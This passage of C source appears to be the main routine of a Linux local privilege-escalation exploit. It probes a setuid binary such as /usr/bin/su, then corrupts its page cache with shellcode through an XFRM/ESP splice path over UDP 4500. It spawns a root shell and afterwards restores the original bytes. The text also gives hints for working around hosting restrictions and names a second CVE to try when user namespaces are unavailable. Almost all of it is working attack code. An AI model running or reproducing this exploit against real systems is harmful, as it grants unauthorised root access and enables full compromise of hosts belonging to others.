		execlp("/bin/bash", "bash", (char *)NULL);
		_exit(1);
	}

	print_banner();

	if (check_kernel_config() < 0)
		return 1;

	if (check_userns_runtime() < 0)
		return 1;

	if (scan_setuid_binaries() < 0)
		return 1;

	phase_header(4, "ESP corrupt (XFRM/UDP 4500)");
	printf("  %s→%s target: %s%s%s\n\n", C(C_DIM), C(C_RST), C(C_MAG), g_target, C(C_RST));

	{
		char why[256];
		if (probe_target(g_target, why, sizeof(why)) < 0) {
			status_line("target", 0, why);
			fprintf(stderr,
				"\n%s  [!] Exploit needs read+execute on the setuid binary (open for splice).%s\n",
				C(C_YEL), C(C_RST));
			fprintf(stderr,
				"%s  [!] Shared hosting often blocks reading /usr/bin/su even though 'find' lists it.%s\n",
				C(C_YEL), C(C_RST));
			fprintf(stderr,
				"%s  [!] Use a full VM/VPS/lab where you can: cat %s | head -c 4%s\n\n",
				C(C_YEL), g_target, C(C_RST));
			return 1;
		}
	}
	status_line("target", 1, "setuid + readable + openable");

	if (target_already_patched(g_target)) {
		status_line("patch", 1, "already patched — skip corrupt stage");
	} else {
		if (save_original(g_target) < 0) {
			status_line("backup", 0, "failed to save 192 original bytes");
			return 1;
		}
		status_line("backup", 1, "192 bytes saved");

		printf("\n%s  [*] unshare userns+netns, register %d XFRM SA, splice→UDP 4500...%s\n",
		       C(C_YEL), TOTAL_SAS, C(C_RST));

		{
			char err[256];
			if (run_esp_corrupt_stage(err, sizeof(err)) < 0) {
				status_line("corrupt", 0, err[0] ? err : "ESP path failed");
				fprintf(stderr,
					"\n%s  [!] Common on shared/VPS hosts: XFRM netlink blocked, splice restricted, or kernel patched.%s\n",
					C(C_YEL), C(C_RST));
				fprintf(stderr,
					"%s  [!] Try: uname -r  and test on WSL2/lab. Without userns: CVE-2026-43500 (rxrpc).%s\n\n",
					C(C_YEL), C(C_RST));
				return 1;
			}
		}
		status_line("corrupt", 1, "all iterations done");
		status_line("verify", 1, "shellcode marker at 0x78 OK");
	}

	phase_header(5, "root shell");
	printf("\n%s", C(C_GRN));
	printf("  ╔══════════════════════════════════════╗\n");
	printf("  ║  root shell — exit to restore        ║\n");
	printf("  ╚══════════════════════════════════════╝\n");
	printf("%s\n", C(C_RST));

	printf("  %s→%s spawn: %s%s\n\n", C(C_DIM), C(C_RST), g_target, C(C_RST));
	if (run_root_pty() < 0) {
		status_line("pty", 0, "PTY failed, trying direct exec");
		exec_patched_target();
		fprintf(stderr, "%s  [!] exec %s: %s%s\n", C(C_RED), g_target, strerror(errno), C(C_RST));
		return 1;
	}

	printf("\n%s  [*] shell closed — restoring page cache...%s\n", C(C_YEL), C(C_RST));
	if (restore_original() < 0) {
		fprintf(stderr, "%s  [!] restore failed — try: echo 3 | sudo tee /proc/sys/vm/drop_caches%s\n",
		        C(C_RED), C(C_RST));
		return 1;
	}
	printf("%s  [+] target restored from disk.%s\n\n", C(C_GRN), C(C_RST));
	return 0;
}

